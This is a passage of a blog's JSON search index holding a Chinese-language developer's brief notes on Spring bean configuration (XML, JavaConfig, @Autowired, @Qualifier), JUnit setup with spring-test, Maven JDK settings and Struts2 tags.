方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"延遲加載 通常用於單例模式 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:10:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"xml 配置 lazy-init=“true” ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:10:1","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"自動配裝 @Component @Lazy ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:10:2","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"JavaConfig @Bean @Lazy ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:10:3","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"初始化方法和銷毀方法 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:11:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"xml 配置 init-method=“init” destory-method=“destory” ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:11:1","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"自動配裝和 JavaConfig @PostConstruct public void init() { System.out.println(\"始化方法\"); } @PreDestroy public void destroy() { System.out.println(\"銷毀方法\"); } ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:11:2","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"工廠方法 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:12:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"靜態工廠方法 \u003cbean id=\"student1\" class=\"com.xxx.Student\" factory-method=\"createStudent1\"/\u003e ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:12:1","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"實例方法 \u003cbean id=\"studentFactory\" class=\"com.xxx.Student\" /\u003e \u003cbean id=\"student2\" factory-bean=\"studentFactory\" factory-method=\"createStudent1\" /\u003e ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:12:2","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"props 屬性 其他參考: 【Spring学习12】XML简写p-namespace及c-namespace_java_程序老兵的博客-CSDN博客 菜鳥工程師 肉豬: Spring 注入properties檔的參數設定 Joseph 筆記本: Java Spring Framework 筆記 - Bean configutation file 設定 spring中constructor-arg 构造方法注入 - 红色小宇宙 - 博客园 ","date":"2020-05-16","objectID":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/:13:0","tags":["spring"],"title":"手動配置 XML 注入 Bean 方法","uri":"/blog/posts/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"這邊不使用自動載入 ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:0:0","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"一般注入 @Configuration public class ...{ @Bean public UserDao userDaoNormal{ return new UserDaoNormal(); } } ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:1:0","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"建構式注入 ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:2:0","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"一般方法 @Configuration public class ...{ @Bean public UserService userServiceNormal(){ UserDao userDao = userDaoNormal(); return new UserService(userDao); } } ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:2:1","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"更好的方法(不多一個 instance ) @Configuration public class ...{ @Bean public UserDao userDaoNormal{ return new UserDaoNormal(); } @Bean public UserService userServiceNormal(userDao userDao){ return new UserService(userDao); } } ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:2:2","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"setter 注入方法 @Configuration public class ...{ @Bean public UserDao userDaoNormal{ return new UserDaoNormal(); } @Bean public UserService setUserDao(userDao userDao){ return new UserService(userDao); } } ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:3:0","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"任意方法也可以 @Configuration public class ...{ @Bean public UserDao userDaoNormal{ return new UserDaoNormal(); } @Bean public UserService prepareUserDao(userDao userDao){ return new UserService(userDao); } } ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:3:1","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"解決衝突方法 自動注入和 JavaConfig 解決方案一致 ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:4:0","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"@Primary ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:4:1","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"Qualifier(“xxxXxxx”) @Qualifier(“xxXxxx”) 宣告 or 參數 @Qualifier(“xxxXxxx”) 宣告 ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:4:2","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"@Bean 命名方法 默認 @Bean 方法名稱 ","date":"2020-05-13","objectID":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/:4:3","tags":["java","spring"],"title":"JavaConfig 設定 bean 物件","uri":"/blog/posts/JavaConfig-%E8%A8%AD%E5%AE%9A-bean-%E7%89%A9%E4%BB%B6/"},{"categories":["Java"],"content":"自動注入筆記 ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:0:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"autowired 加載方式 ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:1:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"建構子 ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:1:1","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"成員變數 ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:1:2","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"setter method ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:1:3","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"任意 method ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:1:4","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"XML 自動掛載 \u003ccontent:component-scan base-package=\"com.xxxx.oooo\"\u003e ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:2:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"自動載入相關 annotation ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:3:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"自動載入 組間掃描 @Component @ComponentScan 自動注入 @Autowired ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:3:1","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"定義配置類 @Configuration(classes=AppConfig.class) ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:3:2","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"JUnit 安裝 設定 JUnit Library 加載 pom.xml 設定 spring-test,junit 如下設定參考 \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003ecom.qfedu\u003c/groupId\u003e \u003cartifactId\u003espring01demo\u003c/artifactId\u003e \u003cversion\u003e0.0.1-SNAPSHOT\u003c/version\u003e \u003cdependencies\u003e \u003c!-- https://mvnrepository.com/artifact/org.springframework/spring-context --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-context\u003c/artifactId\u003e \u003cversion\u003e4.3.13.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003elog4j\u003c/groupId\u003e \u003cartifactId\u003elog4j\u003c/artifactId\u003e \u003cversion\u003e1.2.17\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.12\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-test\u003c/artifactId\u003e \u003cversion\u003e4.3.13.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e 設定 test 程式加入 設定 @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(classes = AppConfig.class) **這邊注意 package hello; import org.junit.Test; import org.junit.runner.RunWith; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.test.context.ContextConfiguration; import org.springframework.test.context.junit4.SpringJUnit4ClassRunner; @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(classes = AppConfig.class) public class testHello { @Autowired private MessagePrinter messagePrinter; @Test public void testPrint() { messagePrinter.printMessage(); } } 自動載入 @Autowired 下面程式參考:JUnit高级用法之@RunWith - 摆渡者 - OSCHINA @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(locations = { \"classpath:applicationContext.xml\" }) public class UserManagerTest { @Autowired ApplicationContext ctx; @Test public void testAddUser() { try { UserManager userManager = ctx.getBean(UserManager.class); userManager.addUser(); } catch (Exception e) { e.printStackTrace(); } } } ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:3:3","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"自動配裝衝突 @Primary 在 Component 定義 @primary @Qualifier 默認 宣告 和 配裝 使用 @Qualifier @Qualifier 自動配裝可使用 bean id(第一個小寫) @Qualifier(“helloWorld”) ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:4:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"相關載入事情 @Resource( name = “helloWorld” ) @Resource( name = \"helloWorld\" ) 等於 @Autowired @Qualifier( name = \"helloWorld\" ) @Controller , @Service, @Repository @Controller , @Service, @Repository 等於 @Component 相同功能 比較有語意，跟 @Component 沒什麼差別。 ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:5:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Autowired (require = false ) if(xxx == null) ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:6:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"指定掃描 @ComponentScan( “com.xxx.demo” ) 掃描底下 “com.xxx.demo\"的所有 Package @ComponentScan( basePackages = {“com.xxx.demo.web”, “com.xxx.demo.service”, “com.xxx.demo.dao”}) 解決上面不能放多個 @ComponentScan( basePackageClasses = {MessagePrinter.class, MessageService.class}) 上面嚴重缺點，不能自動用程式\"重構\"功能，連帶修改 ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:7:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"小記 這邊的 @Autowired 預設都是單例模式 額且啟動服務(這邊講的是 Web )的時候，這些套件就會自動載入 這邊也順便紀錄一下，Servlet 生命週期，init() 是 request 觸發的時候會觸發 Servlet 其實也算是只會實例一個，不是多個 Servlet 程式 所以在多執行緒需要注意一下問題… ","date":"2020-05-11","objectID":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:8:0","tags":["spring","junit"],"title":"Spring 自動注入小記","uri":"/blog/posts/Spring-%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"最近使用 struts2 \u003cs:property value=\"text\"\u003e 但在 JSP 頁面要做 if 判斷 我今天抓不到 struts2 test值 剛好網路爬文就找到這篇EL、OGNL、JSTL和struts标签的区别_数据库_qq30211478的博客-CSDN博客 順便整理 ","date":"2020-05-10","objectID":"/blog/posts/JSP-%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%9C%8B%E6%A8%99%E7%B1%A4%E5%B0%8F%E8%A8%98-JSTL-EL-ONGL/:0:0","tags":["jstl","ongl","el"],"title":"JSP 一些常看標籤小記(JSTL, EL, ONGL)","uri":"/blog/posts/JSP-%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%9C%8B%E6%A8%99%E7%B1%A4%E5%B0%8F%E8%A8%98-JSTL-EL-ONGL/"},{"categories":["Java"],"content":"先解 struts2 我遇到的問題 \u003cs:if test=\"\"\u003e 要怎麼判斷 \u003cs:property value=\"msg\"\u003e 呢? \u003cs:if test='messageStore == \"Hello Struts User (from toString)\"'\u003e 123456789 \u003c/s:if\u003e 阿信 (Silver8250) 的冷泡咖啡館~: [Struts2] Struts2 Data Tags EL、OGNL、JSTL和struts标签的区别_数据库_qq30211478的博客-CSDN博客 C标签和s标签的对比，特别是里面的if判断条件的写法_java_寂寞是一个人的狂欢，狂欢是一群人的寂寞…-CSDN博客 jsp中c:if与s:if的区别 - struggle_beiJing - 博客园 ","date":"2020-05-10","objectID":"/blog/posts/JSP-%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%9C%8B%E6%A8%99%E7%B1%A4%E5%B0%8F%E8%A8%98-JSTL-EL-ONGL/:1:0","tags":["jstl","ongl","el"],"title":"JSP 一些常看標籤小記(JSTL, EL, ONGL)","uri":"/blog/posts/JSP-%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%9C%8B%E6%A8%99%E7%B1%A4%E5%B0%8F%E8%A8%98-JSTL-EL-ONGL/"},{"categories":["Java"],"content":"最近看了一些 Spring 教學 這篇整理一下建制 Spring 需要步驟 ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:0:0","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"Eclipse 使用 Maven 建置 Spring ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:1:0","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"建置 Maven 預到 Eclipse 警告 參考:Maven錯誤 – #001 – JDK預設版本1.5 – Syuan的筆記 不知道是我的 Eclipse 自帶 Maven 我測試把 setting.xml 複製到 C:\\Users\\Administrator\\.m2 我是用 Chocolatey 安裝 Maven 可以到C:\\ProgramData\\Chocolatey\\lib\\maven 找到 setting.xml 因為我安裝是 1.13 JDK 版本，所以這邊調整 1.13 \u003cprofiles\u003e \u003cprofile\u003e \u003cid\u003ejdk1.13\u003c/id\u003e \u003cactivation\u003e \u003cactiveByDefault\u003etrue\u003c/activeByDefault\u003e \u003cjdk\u003e1.13\u003c/jdk\u003e \u003c/activation\u003e \u003cproperties\u003e \u003cmaven.compiler.source\u003e1.13\u003c/maven.compiler.source\u003e \u003cmaven.compiler.target\u003e1.13\u003c/maven.compiler.target\u003e \u003cmaven.compiler.compilerVersion\u003e1.13\u003c/maven.compiler.compilerVersion\u003e \u003c/properties\u003e \u003c/profile\u003e \u003c!-- profile 這樣建置新專案就不會有問題了 ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:1:1","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"一般呼叫 Object package hello; public class Application { public static void main(String[] args) { System.out.println(\"application\"); MessagePrinter printer = new MessagePrinter(); MessageService service = new MessageService(); printer.setService(service); printer.printMessage(); } } package hello; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Component; public class MessagePrinter { /** * 設定 MessageService 關係 */ private MessageService service; public MessagePrinter() { super(); System.out.println(\"MessagePrinter...\"); } /** * 設定 service 值 * @param service */ @Autowired public void setService(MessageService service) { this.service = service; } public void printMessage() { System.out.print(this.service.getMessage()); } } package hello; import org.springframework.stereotype.Component; public class MessageService { public MessageService() { super(); System.out.println(\"MessageService...\"); } /** * print Hello World * @return print Hello World */ public String getMessage() { return \"Hello World\"; } } ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:2:0","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"Spring Autowired 方式(annotation) 這邊簡單說幾個 annotation 重點 @Component @ComponentScan 標籤需要放在主程式，會掃有關 @Component @Autowired 放在 setXXXX(MessageService service) 這邊跟我公司實戰上不時一樣 但這應該是最原始寫法 package hello; import org.springframework.context.ApplicationContext; import org.springframework.context.annotation.AnnotationConfigApplicationContext; import org.springframework.context.annotation.ComponentScan; /** * 可以掃描 @Component * */ @ComponentScan public class ApplicationSpring { private static ApplicationContext context; public static void main(String[] args) { System.out.println(\"applicationSpring\"); context = new AnnotationConfigApplicationContext(ApplicationSpring.class); // 從容器中獲取 MessagePrinter 物件 MessagePrinter printer = context.getBean(MessagePrinter.class); // MessageService service = context.getBean(MessageService.class); System.out.println(printer); // System.out.println(service); // printer.setService(service); printer.printMessage(); } } package hello; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Component; @Component public class MessagePrinter { /** * 設定 MessageService 關係 */ private MessageService service; public MessagePrinter() { super(); System.out.println(\"MessagePrinter...\"); } /** * 設定 service 值 * @param service */ @Autowired public void setService(MessageService service) { this.service = service; } public void printMessage() { System.out.print(this.service.getMessage()); } } package hello; import org.springframework.stereotype.Component; @Component public class MessageService { public MessageService() { super(); System.out.println(\"MessageService...\"); } /** * print Hello World * @return print Hello World */ public String getMessage() { return \"Hello World\"; } } ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:3:0","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"Spring Autowired 方式(xml) 傳統 XML 配置 package hello; import org.springframework.context.ApplicationContext; import org.springframework.context.annotation.ClassPathXmlApplicationContext; public class ApplicationSpring { public static void main(String[] args) { System.out.println(\"applicationSpring\"); ApplicationContext context = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); // 從容器中獲取 MessagePrinter 物件 MessagePrinter printer = context.getBean(MessagePrinter.class); System.out.println(printer); printer.printMessage(); } } 其他的 Java 就把所有 @xxx 拿掉 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"\u003e \u003c!-- bean 元素: 